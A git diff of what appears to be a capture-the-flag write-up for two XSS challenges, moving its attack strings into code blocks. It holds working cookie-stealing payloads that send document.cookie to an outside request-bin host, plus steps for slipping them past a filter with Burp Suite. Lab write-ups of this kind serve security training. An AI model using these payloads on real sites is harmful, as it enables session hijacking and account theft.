@@ -109,7 +109,10 @@ d. CTF XSS 5
   - Check the attack possibility of using an attack statement on the board => <script>alert(1)</script>
   - Using the Burp Suite, the website should be intercepted step by step
   - Create a new post and forward
-  - Check the attack statement => <script>var cookieData = document.cookie; var i = new Image();i.src = "http://enjt04rx79at.x.pipedream.net/?cookie=" + cookieData;</script>
+  - Check the attack statement
+```javascript
+<script>var cookieData = document.cookie; var i = new Image();i.src = "http://enjt04rx79at.x.pipedream.net/?cookie=" + cookieData;</script>
+```
   - During the intercept, change the filtered attack statement
   - Open the new post and copy the URL and input the URL on the admin visit bar
   - Check the flag on https://public.requestbin.com/
@@ -119,8 +122,14 @@ e. CTF XSS 6
   - Check the attack possibility in the Burp Suite
   - The POST proxy sends to Repeater and changes the method to GET
   - Check special characters and it works
-  - Check the attack statement => +]');alert(1)//
-  - Check the attack => +]');location.href='http://enjt04rx79at.x.pipedream.net/?cookie='%2bdocument.cookie;//
+  - Check the attack statement
+```javascript
++]');alert(1)//
+```
+  - Check the attack
+```javascript
++]');location.href='http://enjt04rx79at.x.pipedream.net/?cookie='%2bdocument.cookie;//
+```
   - Copy URL and input the URL on the admin visit bar
   - Check the flag on https://public.requestbin.com/
 
